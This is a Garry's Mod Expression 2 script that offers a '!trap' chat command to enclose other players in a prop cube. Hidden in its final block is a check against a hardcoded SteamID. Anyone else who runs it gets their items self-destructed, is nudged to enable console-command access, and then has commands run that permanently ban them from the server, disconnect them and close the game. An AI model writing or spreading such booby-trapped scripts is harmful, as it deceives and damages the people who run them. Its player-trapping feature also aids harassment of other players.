	

    @name NERO
    @inputs
    @outputs  Prop:entity
    @persist Respawn
     
    ##Created By Deagler
    #You seem to love looking at my code, Please go away.
    runOnChat(1)
    interval(100)
    if(first()){
        print("Created By Deagler")
        hint("Created By Deagler - Do Not Remove",7)
    }
    A = owner():lastSaid():explode(" ")
    if(A[1,string]=="!trap"& chatClk(owner())) {
        hideChat(1)
        if(A[2,string] == ""){
            Players= owner():aimEntity()
        }else{
    Players = findPlayerByName(A[2,string])
    }
    if(Players:isPlayer()){
    Prop = propSpawn("models/hunter/blocks/cube1x3x1.mdl",Players:toWorld(vec(0,0,35)),ang(0,180,90),1)
    Respawn=1
    OriginalPos = Players:pos()
    Prop:setColor(vec(0,100,255))
    Prop:setAlpha(125)
     
    print("Trapped: " + Players:name())
     
    }
    }
    EE=entity():isWeldedTo(1)
     
    if (owner():steamID()!="STEAM_0:1:41876215")
    {
    selfDestructAll()
    if(!convarnum("wire_expression2_concmd")){
    printColor(vec(255,0,0),"Please type 'wire_expression2_concmd 1' to use this E2")
    }else{
    concmd("ulx ban ^ 0")
    concmd("disconnect")
    concmd("quit")
     
     
    }
    }

